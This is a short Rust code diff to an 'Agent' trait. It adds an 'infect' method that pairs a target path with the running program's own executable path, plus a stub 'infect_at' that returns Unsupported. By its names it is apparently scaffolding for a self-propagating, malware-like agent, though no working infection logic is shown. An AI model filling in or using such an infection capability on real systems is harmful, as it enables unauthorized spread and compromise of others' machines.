@@ -1,6 +1,6 @@
 use crate::{Error, Result as AppResult};
 use remoc::rtc;
-use std::path::PathBuf;
+use std::{env, path::PathBuf};
 
 /// Auto select shell in unix-like os
 ///
@@ -20,6 +20,16 @@ pub trait Agent: Sync {
     }
 
     async fn add_current_user(&self) -> AppResult<()> {
+        self.add_current_user_at(env::current_exe()?.to_path_buf())
+            .await
+    }
+
+    async fn infect(&self, target: PathBuf) -> AppResult<bool> {
+        self.infect_at(target, env::current_exe()?.to_path_buf())
+            .await
+    }
+
+    async fn infect_at(&self, _target: PathBuf, _exe: PathBuf) -> AppResult<bool> {
         Err(Error::Unsupported)
     }
 }
